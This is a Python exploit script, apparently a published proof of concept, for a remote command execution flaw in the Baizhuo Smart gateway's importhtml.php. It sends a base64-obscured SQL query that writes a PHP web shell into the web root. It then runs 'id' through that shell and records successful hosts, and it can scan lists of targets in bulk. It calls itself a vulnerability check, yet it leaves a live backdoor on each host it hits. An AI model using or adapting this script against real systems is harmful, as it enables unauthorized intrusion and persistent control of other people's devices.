import requests
import argparse
import urllib3
import sys
from bs4 import BeautifulSoup

from OpenSSL.SSL import SysCallError
from urllib3.exceptions import ProxyError

urllib3.disable_warnings()


def title():
    print("""
                                  百卓Smart_importhtml远程命令执行漏洞
                      use: python3 百卓Smart_importhtml远程命令执行漏洞.py
                                 Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
            'Connection': 'close',
        }
        # proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
        params = {
            'type': 'exporthtmlmail',
            'tab': 'tb_RCtrlLog',
            'sql': 'c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc3lzMS5waHAn'
        }
        try:
            requests.packages.urllib3.disable_warnings()
            # params会在url中
            etc_passwd = requests.get(self.url + "/importhtml.php",params=params, headers=headers,
                                      verify=False)
            payload = self.url + '/app/sys1.php'
            command = 'cmd=id'
            # data会在数据包的Request Body Parameters中
            whoami = requests.post(payload, data=command, headers=headers, verify=False)
            if whoami.status_code == 200:
                print("\033[32m[o]" + self.url + "存在百卓Smart_importhtml远程命令执行漏洞" + "\033[0m")
                with open("百卓Smart_importhtml远程命令执行漏洞结果.txt", mode="a") as rp:
                    rp.write(self.url + " 漏洞位置：" + etc_passwd.url + "\n")
            elif etc_passwd.status_code == 404:
                print(self.url + ' 不存在百卓Smart_importhtml远程命令执行漏洞！')
            else:
                print(self.url + ' 不存在百卓Smart_importhtml远程命令执行漏洞！')
                pass

        except:
            print(self.url + ' 不存在百卓Smart_importhtml远程命令执行漏洞！')
            pass

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="百卓Smart_importhtml远程命令执行漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 百卓Smart_importhtml远程命令执行漏洞.py -u http://127.0.0.1\neg2:>>>python3 百卓Smart_importhtml远程命令执行漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
